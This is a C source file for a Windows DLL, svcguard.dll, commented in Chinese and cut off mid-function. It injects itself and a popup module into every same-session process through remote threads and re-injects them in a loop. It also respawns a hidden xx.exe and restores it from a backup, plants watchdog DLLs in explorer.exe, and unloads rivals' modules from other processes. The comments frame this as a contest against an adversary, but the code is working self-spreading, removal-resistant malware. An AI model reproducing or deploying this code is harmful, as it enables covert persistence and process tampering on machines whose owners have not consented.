/*
 * svcguard.dll - 守护与复活（日志格式化已修正）
 * 编译：gcc -shared -o svcguard.dll deamon.c -ladvapi32 -lpsapi -lshell32 -static -s -O2
 */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <shellapi.h>
#include <stdio.h>
#include <stdarg.h>
#include <time.h>

/* 共享内存布局与命名常量：唯一来源见 xxipc.h */
#include "xxipc.h"

/* guard.dll 部署到几个宿主进程（同会话） */
#define GUARD_HOST_MAX  4

static HANDLE g_hSharedMem = NULL;
static PVOID  g_pSharedView = NULL;
static WCHAR  g_szXxExePath[MAX_PATH] = L"";
static WCHAR  g_szWindowDllPath[MAX_PATH] = L"";
static WCHAR  g_szDeamonDllPath[MAX_PATH] = L"";
static WCHAR  g_szGuardDllPath[MAX_PATH] = L"";
static DWORD  g_guardPids[GUARD_HOST_MAX] = { 0 };
static int    g_guardCount = 0;
static volatile LONG g_bExitFlag = 0;
static CRITICAL_SECTION g_csLog;
static BOOL g_csLogInit = FALSE;

/* 前置声明（HeartbeatMonitor 会用到后面定义的这两个判定） */
static BOOL IsRunningInXxExe(void);
static BOOL IsProtected(LPCWSTR name);
static BOOL InitPaths(void);
static void ForceWindowRestartInHosts(void);

/* 注入缓存：避免每轮对所有进程反复 OpenProcess / EnumProcessModules / 远程线程。
   每 INJ_REFRESH_MS 全量重扫一次，兼顾 PID 复用与后续被卸载的情况。 */
#define INJ_CACHE_MAX   2048
#define INJ_REFRESH_MS  10000
static DWORD g_injPid[INJ_CACHE_MAX];
static int   g_injCount = 0;
static DWORD g_injLastRefresh = 0;

static BOOL InjCacheHas(DWORD pid) {
    for (int i = 0; i < g_injCount; i++)
        if (g_injPid[i] == pid) return TRUE;
    return FALSE;
}
static void InjCacheAdd(DWORD pid) {
    if (g_injCount < INJ_CACHE_MAX) g_injPid[g_injCount++] = pid;
}
static void InjCacheRefreshIfDue(void) {
    DWORD now = GetTickCount();
    if (g_injLastRefresh == 0 || now - g_injLastRefresh >= INJ_REFRESH_MS) {
        g_injCount = 0;
        g_injLastRefresh = now;
    }
}

static void EnsureLogInit(void) {
    if (g_csLogInit) return;
    InitializeCriticalSection(&g_csLog);
    g_csLogInit = TRUE;
    if (!g_pSharedView) {
        g_hSharedMem = XXOpenShared();
        if (g_hSharedMem)
            g_pSharedView = MapViewOfFile(g_hSharedMem, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, SHARED_MEM_SIZE);
    }
}

/* 日志：只写共享内存窗口，不写文件 */
static void WriteDeamonLog(const WCHAR* fmt, ...) {
    EnsureLogInit();
    if (!g_pSharedView) return;

    SYSTEMTIME st;
    GetLocalTime(&st);
    WCHAR szLine[512];
    va_list args;
    va_start(args, fmt);
    _vsnwprintf(szLine, _countof(szLine) - 1, fmt, args);
    va_end(args);
    szLine[_countof(szLine) - 1] = L'\0';

    WCHAR entry[600];
    _snwprintf(entry, _countof(entry) - 1, L"[%02d:%02d:%02d.%03d] [deamon] %s\r\n",
               st.wHour, st.wMinute, st.wSecond, st.wMilliseconds, szLine);
    entry[_countof(entry) - 1] = L'\0';

    EnterCriticalSection(&g_csLog);
    WCHAR *pLog = (WCHAR *)((BYTE *)g_pSharedView + OFFSET_LOG);
    size_t maxLen = (LOG_SIZE / sizeof(WCHAR)) - 1;
    size_t len = XXLogLen(pLog, maxLen + 1);
    if (len > maxLen) { pLog[maxLen] = L'\0'; len = maxLen; }
    size_t newLen = wcslen(entry);
    if (len + newLen <= maxLen) {
        /* 第二参是缓冲区总容量（含结尾 NUL），不是剩余空间 */
        wcscat_s(pLog, maxLen + 1 - len, entry);
    } else {
        /* 丢掉最旧的一段，只保留最近 maxLen 个字符 */
        size_t drop = len + newLen - maxLen;
        if (drop < len) {
            memmove(pLog, pLog + drop, (len - drop) * sizeof(WCHAR));
            pLog[len - drop] = L'\0';
        } else {
            pLog[0] = L'\0';
        }
        wcscat_s(pLog, maxLen + 1 - wcslen(pLog), entry);
    }
    LeaveCriticalSection(&g_csLog);
}

static BOOL OpenSharedMemory(void) {
    for (int i = 0; i < 5; i++) {
        g_hSharedMem = XXOpenShared();
        if (g_hSharedMem) {
            g_pSharedView = MapViewOfFile(g_hSharedMem, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, SHARED_MEM_SIZE);
            if (g_pSharedView) return TRUE;
            CloseHandle(g_hSharedMem);
        }
        Sleep(1000);
    }
    return FALSE;
}

static BOOL InitPaths(void) {
    WCHAR dllPath[MAX_PATH];
    if (!GetModuleFileNameW(GetModuleHandleW(L"svcguard.dll"), dllPath, MAX_PATH))
        return FALSE;

    WCHAR* pSlash = wcsrchr(dllPath, L'\\');
    if (pSlash) {
        *(pSlash + 1) = L'\0';       /* 截断到目录 */
    } else {
        /* 没有反斜杠，可能只有驱动器号，补上反斜杠 */
        wcscat_s(dllPath, MAX_PATH, L"\\");
    }

    swprintf_s(g_szXxExePath, MAX_PATH, L"%sxx.exe", dllPath);
    swprintf_s(g_szWindowDllPath, MAX_PATH, L"%swindow.dll", dllPath);
    swprintf_s(g_szDeamonDllPath, MAX_PATH, L"%ssvcguard.dll", dllPath);
    swprintf_s(g_szGuardDllPath, MAX_PATH, L"%sguard.dll", dllPath);

    WriteDeamonLog(L"Paths: xx=%ls, window=%ls, guard=%ls\n",
                   g_szXxExePath, g_szWindowDllPath, g_szGuardDllPath);
    return TRUE;
}

/* xx.exe 被对手删除时，从同目录 xxres.bin 备份还原 */
static void EnsureXxExeExists(void) {
    if (GetFileAttributesW(g_szXxExePath) != INVALID_FILE_ATTRIBUTES) return;
    WCHAR dir[MAX_PATH], bak[MAX_PATH];
    wcscpy_s(dir, MAX_PATH, g_szXxExePath);
    WCHAR *p = wcsrchr(dir, L'\\');
    if (p) *(p + 1) = L'\0';
    swprintf_s(bak, MAX_PATH, L"%sxxres.bin", dir);
    if (GetFileAttributesW(bak) != INVALID_FILE_ATTRIBUTES) {
        if (CopyFileW(bak, g_szXxExePath, FALSE))
            WriteDeamonLog(L"已从备份还原 xx.exe: %ls\n", g_szXxExePath);
    }
}

/* 弹窗存活判据 = 共享内存心跳计数器（window.dll 弹窗每 500ms 递增一次）。
   不再等待事件对象：手动重置事件 SetEvent 之后永不超时，超时复活分支是死代码，
   而且忙等会吃满一个核。监视循环见下方 HeartbeatMonitor（定义在 RespawnXX 之后）。 */

static BOOL IsXxProcessRunning(void) {
    HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (h == INVALID_HANDLE_VALUE) return FALSE;
    PROCESSENTRY32W pe = { sizeof(pe) };
    BOOL found = FALSE;
    if (Process32FirstW(h, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"xx.exe") == 0) { found = TRUE; break; }
        } while (Process32NextW(h, &pe));
    }
    CloseHandle(h);
    return found;
}

static void RespawnXX(void) {
    /* 多实例（各宿主里的 svcguard + defense 看门狗）可能同时判定需要复活，
       用命名互斥锁串行化，避免同一时刻拉起多个 xx.exe。 */
    HANDLE hOnce = CreateMutexW(NULL, FALSE, L"Global\\xx_respawn_guard");
    DWORD  w = hOnce ? WaitForSingleObject(hOnce, 3000) : WAIT_OBJECT_0;
    BOOL   bOwn = (hOnce != NULL && (w == WAIT_OBJECT_0 || w == WAIT_ABANDONED));

    if (hOnce && !bOwn) {
        CloseHandle(hOnce);
        WriteDeamonLog(L"另一个实例正在复活 xx.exe，跳过\n");
        return;
    }

    WriteDeamonLog(L"检测到 xx 心跳丢失，准备复活 xx.exe: %ls\n", g_szXxExePath);
    EnsureXxExeExists();
    if (GetFileAttributesW(g_szXxExePath) == INVALID_FILE_ATTRIBUTES) {
        WriteDeamonLog(L"xx.exe 文件不存在，无法复活: %ls\n", g_szXxExePath);
    } else if (IsXxProcessRunning()) {
        /* 已有实例在运行就不重复拉起（避免与 defense.dll 看门狗双重复活） */
        WriteDeamonLog(L"xx.exe 已在运行，跳过复活\n");
    } else {
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        if (!CreateProcessW(g_szXxExePath, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            ShellExecuteW(NULL, L"open", g_szXxExePath, NULL, NULL, SW_HIDE);
            WriteDeamonLog(L"复活方式=ShellExecute\n");
        } else {
            WriteDeamonLog(L"复活方式=CreateProcess 成功 新PID=%lu\n", pi.dwProcessId);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }

    if (bOwn) ReleaseMutex(hOnce);
    if (hOnce) CloseHandle(hOnce);
}

/* 心跳停摆但 xx.exe 还活着时，RespawnXX 会因为"已有实例在运行"而跳过，
   弹窗可能就永远回不来（window.dll 被对手卸载/加载失败）。这里补一刀：
   若本实例就在 xx.exe 内，且 window.dll 不在本进程里，就地重新加载。 */
static void EnsureWindowModuleHere(void) {
    if (!IsRunningInXxExe()) return;
    if (GetModuleHandleW(L"window.dll")) return;
    if (g_szWindowDllPath[0] == L'\0' && !InitPaths()) return;
    if (LoadLibraryW(g_szWindowDllPath))
        WriteDeamonLog(L"心跳停摆：已重新加载 window.dll\n");
    else
        WriteDeamonLog(L"心跳停摆：重新加载 window.dll 失败 err=%lu\n", GetLastError());
}

static DWORD WINAPI HeartbeatMonitor(LPVOID lp) {
    LONG lastTick;
    DWORD lastChange;
    DWORD lastRecover = 0;
    BOOL bStale = FALSE;

    UNREFERENCED_PARAMETER(lp);
    WriteDeamonLog(L"HeartbeatMonitor started\n");

    /* 共享内存可能比本实例晚就绪；拿不到就等着，绝不因此自我卸载
       （模块已注入宿主进程，退出就再也不会被重新注入）。 */
    for (;;) {
        if (g_bExitFlag) return 0;
        if (!g_pSharedView) OpenSharedMemory();
        if (g_pSharedView) break;
        Sleep(500);
    }
    if (g_szXxExePath[0] == L'\0' && !InitPaths())
        WriteDeamonLog(L"InitPaths failed\n");

    InterlockedIncrement(&XX_COUNTER(g_pSharedView));

    lastTick = XX_HB_TICK(g_pSharedView);
    lastChange = GetTickCount();

    while (!g_bExitFlag) {
        LONG cur;
        DWORD now;

        Sleep(HEARTBEAT_POLL_MS);
        now = GetTickCount();
        cur = XX_HB_TICK(g_pSharedView);

        if (cur != lastTick) {              /* 弹窗还活着 */
            lastTick = cur;
            lastChange = now;
            bStale = FALSE;
            continue;
        }
        if (now - lastChange < HEARTBEAT_STALE_MS) continue;

        if (!bStale) {
            bStale = TRUE;
            WriteDeamonLog(L"弹窗心跳停摆 %lums，开始恢复\n",
                           (unsigned long)(now - lastChange));
        }
        /* 恢复动作按 HEARTBEAT_RECOVER_MS 节流：xx 还活着时 RespawnXX 只会空转，
           没必要每 2.5 秒重扫一遍进程表。 */
        if (lastRecover != 0 && now - lastRecover < HEARTBEAT_RECOVER_MS) continue;

        lastRecover = now;
        lastChange = now;
        lastTick = XX_HB_TICK(g_pSharedView);
        /* 三级恢复：先把本进程的弹窗模块补上，再让宿主里死掉的弹窗线程复活，
           最后才考虑拉起 xx.exe（它还在跑时这一步会自动跳过）。 */
        EnsureWindowModuleHere();
        ForceWindowRestartInHosts();
        RespawnXX();
    }

    InterlockedDecrement(&XX_COUNTER(g_pSharedView));
    return 0;
}

static BOOL IsProtected(LPCWSTR name) {
    static LPCWSTR list[] = {
        L"System", L"smss.exe", L"csrss.exe", L"wininit.exe",
        L"services.exe", L"lsass.exe", L"winlogon.exe",
        L"spoolsv.exe", L"dwm.exe", L"taskhost.exe",
        /* notepad.exe：atkcore 把 notepad 当"敌方宿主"击杀，若我们也往
           notepad 注入 window.dll，弹窗就可能被自己 30ms 一轮的攻击秒掉。 */
        L"notepad.exe", NULL
    };
    for (int i = 0; list[i]; i++)
        if (_wcsicmp(name, list[i]) == 0) return TRUE;
    return FALSE;
}

static BOOL InjectDll(HANDLE hProc, LPCWSTR dllPath, DWORD pid) {
    SIZE_T size = (wcslen(dllPath) + 1) * sizeof(WCHAR);
    LPVOID pMem = VirtualAllocEx(hProc, NULL, size, MEM_COMMIT, PAGE_READWRITE);
    if (!pMem) {
        WriteDeamonLog(L"注入失败 VirtualAllocEx PID=%lu dll=%ls\n", pid, dllPath);
        return FALSE;
    }
    WriteProcessMemory(hProc, pMem, dllPath, size, NULL);
    LPTHREAD_START_ROUTINE pLoadLib = (LPTHREAD_START_ROUTINE)
        GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, pLoadLib, pMem, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, 2000);
        CloseHandle(hThread);
    } else {
        WriteDeamonLog(L"注入 DLL 失败 PID=%lu dll=%ls err=%lu\n", pid, dllPath, GetLastError());
    }
    VirtualFreeEx(hProc, pMem, 0, MEM_RELEASE);
    return (hThread != NULL);
}

/* ================== guard.dll 宿主部署与句柄交接 ==================
   xx.exe 不再自己加载 guard.dll：那样 xx 一旦被结束，guard 会跟着一起死，
   根本没机会复活 xx。改由这里（跑在 xx.exe 内的 svcguard 实例）把 guard.dll
   注入到同会话的宿主进程，并把 **xx 自己的进程句柄** 复制进宿主、登记到共享
   内存句柄表。guard 侧直接用该句柄判活，不再需要 OpenProcess —— xx 的进程
   DACL 把 Everyone 全拒了，OpenProcess 那条路本来就走不通。 */

static BOOL IsRunningInXxExe(void) {
    WCHAR path[MAX_PATH] = L"";
    const WCHAR *base;
    if (!GetModuleFileNameW(NULL, path, MAX_PATH)) return FALSE;
    base = wcsrchr(path, L'\\');
    base = base ? base + 1 : path;
    return (_wcsicmp(base, XX_EXE_NAME_W) == 0);
}

static BOOL IsSameSession(DWORD pid) {
    DWORD mine = 0, sid = 0;
    if (!ProcessIdToSessionId(GetCurrentProcessId(), &mine)) return FALSE;
    if (!ProcessIdToSessionId(pid, &sid)) return FALSE;
    return (mine == sid);
}

static BOOL GuardHostKnown(DWORD pid) {
    for (int i = 0; i < g_guardCount; i++)
        if (g_guardPids[i] == pid) return TRUE;
    return FALSE;
}

static BOOL HostHasOurGuard(DWORD pid) {
    HANDLE h = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    HMODULE mods[1024];
    DWORD needed = 0, count, i;
    BOOL found = FALSE;

    if (!h) return FALSE;
    if (EnumProcessModules(h, mods, sizeof(mods), &needed)) {
        count = needed / sizeof(HMODULE);
        for (i = 0; i < count && !found; i++) {
            WCHAR name[MAX_PATH];
            if (GetModuleFileNameExW(h, mods[i], name, MAX_PATH) &&
                _wcsicmp(name, g_szGuardDllPath) == 0)
                found = TRUE;
        }
    }
    CloseHandle(h);
    return found;
}

static void ClearHandleEntry(DWORD pid) {
    ULONGLONG tag;
    int i;
    if (!g_pSharedView) return;
    tag = (ULONGLONG)XX_TAG(g_pSharedView);
    for (i = 0; i < HDL_TABLE_MAX; i++) {
        if (XX_HDL_PID(g_pSharedView, i) == pid && XX_HDL_TAG(g_pSharedView, i) == tag) {
            XX_HDL_PID(g_pSharedView, i)    = 0;
            XX_HDL_HANDLE(g_pSharedView, i) = 0;
            XX_HDL_TAG(g_pSharedView, i)    = 0;
        }
    }
}

/* 前置声明：Republish 用到后面定义的 PublishGuardHandle */
static void PublishGuardHandle(HANDLE hHost, DWORD pid);

/* 宿主进程消失 / 我们的 guard.dll 被卸掉后要腾出名额，否则再也不会补部署；
   宿主还在则重发一次句柄 —— xx 重启后 tag 与句柄都变了，不重发这个宿主就永远是死条目。 */
static BOOL RepublishGuardHandle(DWORD pid) {
    HANDLE hProc = OpenProcess(PROCESS_DUP_HANDLE, FALSE, pid);
    if (!hProc) return FALSE;
    PublishGuardHandle(hProc, pid);
    CloseHandle(hProc);
    return TRUE;
}

static void DropGuardHost(int i) {
    ClearHandleEntry(g_guardPids[i]);
    g_guardPids[i] = g_guardPids[g_guardCount - 1];
    g_guardPids[g_guardCount - 1] = 0;
    g_guardCount--;
}

static void ValidateGuardHosts(void) {
    int i;
    for (i = 0; i < g_guardCount; i++) {
        if (HostHasOurGuard(g_guardPids[i])) {
            if (!RepublishGuardHandle(g_guardPids[i])) {
                WriteDeamonLog(L"guard 宿主无法重发句柄，改投其它宿主 PID=%lu\n", g_guardPids[i]);
                DropGuardHost(i);
                i--;
            }
        } else {
            WriteDeamonLog(L"guard 宿主失效，重新部署 PID=%lu\n", g_guardPids[i]);
            DropGuardHost(i);
            i--;
        }
    }
}

/* 把 xx 自己的进程句柄复制进 hHost，并登记到共享内存句柄表（按宿主 PID 取用）。
   权限只有 查询+同步：即使同一宿主里的对手 DLL 拿到了这个句柄值，也只能等待/查询，
   无法 TerminateProcess(xx)。句柄值只在宿主进程内有效，所以也不需要额外加密。 */
static void PublishGuardHandle(HANDLE hHost, DWORD pid) {
    HANDLE hSelf = NULL, hDup = NULL;
    ULONGLONG tag;
    int i, slot = -1;

    if (!g_pSharedView || !hHost) return;

    /* 源句柄：优先用 xx.exe 在收紧 DACL 之前打开、并写进共享内存的那一个
       （svcguard 与 xx 同进程，句柄值有效）；没有才现场开一次。
       伪句柄不能跨进程复制，所以这里不做那种"退化"。 */
    hSelf = (HANDLE)(ULONG_PTR)XX_SELF_HANDLE(g_pSharedView);
    if (hSelf && GetProcessId(hSelf) != GetCurrentProcessId())
        hSelf = NULL;                       /* 陈旧/无效值，别把别的对象复制进宿主 */

    if (hSelf) {
        if (!DuplicateHandle(GetCurrentProcess(), hSelf, hHost, &hDup, 0, FALSE, DUPLICATE_SAME_ACCESS)) {
            WriteDeamonLog(L"自持句柄复制失败 err=%lu，改现场打开\n", GetLastError());
            hDup = NULL;
        }
    }
    if (!hDup) {
        hSelf = OpenProcess(XX_SHARED_HANDLE_ACCESS, FALSE, GetCurrentProcessId());
        if (hSelf) {
            if (!DuplicateHandle(GetCurrentProcess(), hSelf, hHost, &hDup, 0, FALSE, DUPLICATE_SAME_ACCESS)) {
                WriteDeamonLog(L"现场句柄复制失败 err=%lu\n", GetLastError());
                hDup = NULL;
            }
            CloseHandle(hSelf);
        }
    }
    if (!hDup) {
        WriteDeamonLog(L"guard 句柄交接失败 PID=%lu\n", pid);
        return;
    }
    /* 注意：hDup 是"在宿主进程里有效"的句柄值，本进程既不能用也不能关。 */

    tag = (ULONGLONG)XX_TAG(g_pSharedView);
    for (i = 0; i < HDL_TABLE_MAX; i++) {
        if (XX_HDL_PID(g_pSharedView, i) == pid && XX_HDL_TAG(g_pSharedView, i) == tag) {
            slot = i;
            break;
        }
    }
    if (slot < 0) {
        for (i = 0; i < HDL_TABLE_MAX; i++) {
            if (XX_HDL_PID(g_pSharedView, i) == 0 || XX_HDL_TAG(g_pSharedView, i) != tag) {
                slot = i;
                break;
            }
        }
    }
    if (slot < 0) slot = (int)(pid % HDL_TABLE_MAX);   /* 表满：按 PID 顶掉一格 */

    /* 发布顺序有讲究：句柄先写，pid/reserved 最后写。
       guard 侧要求 GetProcessId(handle) == reserved，所以"最后写的 reserved"
       等于给整条记录上了一个校验和 —— 中间态（新句柄 + 旧 reserved，或反过来）
       一定校验不过，会被读取方跳过，而不会把一个坏句柄送进 WaitForSingleObject。 */
    XX_HDL_HANDLE(g_pSharedView, slot)   = (ULONGLONG)(ULONG_PTR)hDup;
    XX_HDL_TAG(g_pSharedView, slot)      = tag;
    XX_HDL_RESERVED(g_pSharedView, slot) = GetCurrentProcessId();   /* 句柄指向的 xx PID */
    XX_HDL_PID(g_pSharedView, slot)      = pid;
    WriteDeamonLog(L"guard 句柄已登记 PID=%lu slot=%d\n", pid, slot);
}

static void EnsureGuardHosts(void) {
    DWORD cand[GUARD_HOST_MAX];
    int nCand = 0, pass, i;

    if (g_guardCount >= GUARD_HOST_MAX) return;
    if (g_szGuardDllPath[0] == L'\0') return;
    if (GetFileAttributesW(g_szGuardDllPath) == INVALID_FILE_ATTRIBUTES) return;

    /* pass 0 优先 explorer.exe（同会话里最稳），pass 1 用其它同会话进程补齐 */
    for (pass = 0; pass < 2 && g_guardCount + nCand < GUARD_HOST_MAX; pass++) {
        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        PROCESSENTRY32W pe = { sizeof(pe) };
        if (hSnap == INVALID_HANDLE_VALUE) break;
        if (Process32FirstW(hSnap, &pe)) {
            do {
                BOOL bExplorer = (_wcsicmp(pe.szExeFile, L"explorer.exe") == 0);
                BOOL bDup = FALSE;
                int k;

                if (g_guardCount + nCand >= GUARD_HOST_MAX) break;
                if (pass == 0 && !bExplorer) continue;
                if (pass == 1 && bExplorer) continue;
                if (pe.th32ProcessID == GetCurrentProcessId()) continue;
                if (IsProtected(pe.szExeFile)) continue;
                if (GuardHostKnown(pe.th32ProcessID)) continue;
                for (k = 0; k < nCand; k++)
                    if (cand[k] == pe.th32ProcessID) bDup = TRUE;
                if (bDup) continue;
                if (!IsSameSession(pe.th32ProcessID)) continue;
                cand[nCand++] = pe.th32ProcessID;
            } while (Process32NextW(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }

    for (i = 0; i < nCand; i++) {
        HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
                                   PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE, FALSE, cand[i]);
        BOOL bDupOk = (hProc != NULL);
        if (!hProc)
            hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
                                PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, cand[i]);
        if (!hProc) continue;

        if (InjectDll(hProc, g_szGuardDllPath, cand[i])) {
            if (bDupOk) PublishGuardHandle(hProc, cand[i]);
            if (g_guardCount < GUARD_HOST_MAX) g_guardPids[g_guardCount++] = cand[i];
            WriteDeamonLog(L"guard.dll 已部署到宿主 PID=%lu（句柄%ls）\n",
                           cand[i], bDupOk ? L"已登记" : L"未登记");
        }
        CloseHandle(hProc);
    }
}

/* 弹窗线程可能被 TerminateThread 或已自行退出，而模块还留在宿主里 ——
   注入方看到模块在，不会重新注入，弹窗就永远回不来。这里用"远程线程调用
   window.dll!StartWindow"把它重新拉起来：RVA 用本进程 window.dll 的地址算，
   宿主里的必须是同一个文件（全路径比对）才敢用。 */
static void ForceWindowRestartInHosts(void) {
    HMODULE hLocalWin = GetModuleHandleW(L"window.dll");
    WCHAR localPath[MAX_PATH] = L"";
    ULONG_PTR rva;
    FARPROC pfn;
    HANDLE hSnap;
    PROCESSENTRY32W pe = { sizeof(pe) };
    int done = 0;

    /* 不限定"必须跑在 xx 内"：任何装着同一份 window.dll 的宿主都能做这件事，
       冗余越高越不容易出现"弹窗再也回不来"。 */

    if (!hLocalWin) {
        if (g_szWindowDllPath[0] == L'\0' && !InitPaths()) return;
        hLocalWin = LoadLibraryW(g_szWindowDllPath);
        if (!hLocalWin) return;
    }
    pfn = GetProcAddress(hLocalWin, "StartWindow");
    if (!pfn) return;
    if (!GetModuleFileNameW(hLocalWin, localPath, MAX_PATH)) return;
    rva = (ULONG_PTR)pfn - (ULONG_PTR)hLocalWin;

    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return;
    if (Process32FirstW(hSnap, &pe)) {
        do {
            HANDLE hProc;
            HMODULE mods[1024];
            DWORD needed = 0;
            ULONG_PTR remoteWin = 0;

            if (done >= 2) break;             /* 两个宿主的冗余足够 */
            if (pe.th32ProcessID == GetCurrentProcessId()) continue;
            if (IsProtected(pe.szExeFile)) continue;
            if (!IsSameSession(pe.th32ProcessID)) continue;

            hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
                                PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
                                FALSE, pe.th32ProcessID);
            if (!hProc) continue;
            if (EnumProcessModules(hProc, mods, sizeof(mods), &needed)) {
                DWORD count = needed / sizeof(HMODULE);
                for (DWORD k = 0; k < count; k++) {
                    WCHAR name[MAX_PATH];
                    if (GetModuleFileNameExW(hProc, mods[k], name, MAX_PATH) &&
                        _wcsicmp(name, localPath) == 0) {
                        remoteWin = (ULONG_PTR)mods[k];
                        break;
                    }
                }
            }
            if (remoteWin) {
                HANDLE h = CreateRemoteThread(hProc, NULL, 0,
                                              (LPTHREAD_START_ROUTINE)(remoteWin + rva),
                                              NULL, 0, NULL);
                if (h) {
                    WaitForSingleObject(h, 1000);
                    CloseHandle(h);
                    done++;
                    WriteDeamonLog(L"已远程重新拉起弹窗线程 PID=%lu\n", pe.th32ProcessID);
                }
            }
            CloseHandle(hProc);
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
}

static DWORD WINAPI SpreaderThread(LPVOID lp) {
    BOOL bImXx;
    DWORD dwGuardScan = 0;

    UNREFERENCED_PARAMETER(lp);
    Sleep(5000);
    if (!g_pSharedView) OpenSharedMemory();
    InitPaths();
    bImXx = IsRunningInXxExe();
    if (bImXx) WriteDeamonLog(L"本实例在 xx.exe 内，负责部署 guard.dll 宿主\n");

    while (!g_bExitFlag) {
        InjCacheRefreshIfDue();
        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W pe = { sizeof(pe) };
            if (Process32FirstW(hSnap, &pe)) {
                do {
                    if (IsProtected(pe.szExeFile)) continue;
                    /* 只在本会话扩散：弹窗锁是 Local\（按会话隔离），跨会话注入
                       既帮不上可见弹窗，还可能在别的会话里拉起影子 xx.exe。 */
                    if (!IsSameSession(pe.th32ProcessID)) continue;
                    if (InjCacheHas(pe.th32ProcessID)) continue;
                    HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
                                               PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
                                               FALSE, pe.th32ProcessID);
                    if (!hProc) { InjCacheAdd(pe.th32ProcessID); continue; }

                    BOOL hasDeamon = FALSE, hasWindow = FALSE;
                    HMODULE mods[1024];
                    DWORD needed;
                    if (EnumProcessModules(hProc, mods, sizeof(mods), &needed)) {
                        DWORD count = needed / sizeof(HMODULE);
                        for (DWORD i = 0; i < count; i++) {
                            WCHAR name[MAX_PATH];
                            if (GetModuleFileNameExW(hProc, mods[i], name, MAX_PATH)) {
                                if (!hasDeamon && wcsstr(name, L"svcguard.dll")) hasDeamon = TRUE;
                                else if (!hasWindow && wcsstr(name, L"window.dll")) hasWindow = TRUE;
                            }
                        }
                    }
                    if (!hasDeamon) InjectDll(hProc, g_szDeamonDllPath, pe.th32ProcessID);
                    if (!hasWindow) InjectDll(hProc, g_szWindowDllPath, pe.th32ProcessID);
                    InjCacheAdd(pe.th32ProcessID);
                    CloseHandle(hProc);
                } while (Process32NextW(hSnap, &pe));
            }
            CloseHandle(hSnap);
        }

        if (bImXx) {
            DWORD now = GetTickCount();
            if (dwGuardScan == 0 || now - dwGuardScan >= INJ_REFRESH_MS) {
                dwGuardScan = now;
                ValidateGuardHosts();
                EnsureGuardHosts();
            }
        }
        Sleep(500);
    }
    return 0;
}

/* 卸载对手注入的 guard.dll：只保留与我方同目录的那一份 */
static void UnloadForeignGuardPass(void)
{
    WCHAR ourGuard[MAX_PATH] = L"";
    WCHAR dllPath[MAX_PATH];
    if (GetModuleFileNameW(GetModuleHandleW(L"svcguard.dll"), dllPath, MAX_PATH)) {
        WCHAR *ps = wcsrchr(dllPath, L'\\');
        if (ps) ps[1] = L'\0';
        swprintf_s(ourGuard, MAX_PATH, L"%sguard.dll", dllPath);
    }

    FARPROC pFreeLib = GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "FreeLibrary");
    if (!pFreeLib) return;

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (IsProtected(pe.szExeFile)) continue;
            if (pe.th32ProcessID == GetCurrentProcessId()) continue;
            HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
                                       PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
                                       FALSE, pe.th32ProcessID);
            if (!hProc) continue;

            HMODULE mods[1024];
            DWORD needed = 0;
            if (EnumProcessModules(hProc, mods, sizeof(mods), &needed)) {
                DWORD count = needed / sizeof(HMODULE);
                for (DWORD i = 0; i < count; i++) {
                    WCHAR modPath[MAX_PATH];
                    if (!GetModuleFileNameExW(hProc, mods[i], modPath, MAX_PATH)) continue;
                    const WCHAR *base = wcsrchr(modPath, L'\\');
                    base = base ? base + 1 : modPath;
                    if (_wcsicmp(base, L"guard.dll") != 0) continue;
                    if (ourGuard[0] && _wcsicmp(modPath, ourGuard) == 0) continue;
                    HANDLE h = CreateRemoteThread(hProc, NULL, 0,
                                  (LPTHREAD_START_ROUTINE)pFreeLib, mods[i], 0, NULL);
                    if (h) {
                        WaitForSingleObject(h, 1000);
                        CloseHandle(h);
                        WriteDeamonLog(L"卸载外来 guard.dll: PID=%lu %ls\n", pe.th32ProcessID, modPath);
                    }
                }
            }
            CloseHandle(hProc);
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
}

static DWORD WINAPI UnloadForeignGuardThread(LPVOID lp)
{
    UNREFERENCED_PARAMETER(lp);
    Sleep(3000);
    while (!g_bExitFlag) {
        UnloadForeignGuardPass();
        Sleep(2000);
    }
    return 0;
}

static void StartRemoteAttack(void)
{
    WCHAR dir[MAX_PATH], path[MAX_PATH];
    if (!GetModuleFileNameW(GetModuleHandleW(L"svcguard.dll"), dir, MAX_PATH))
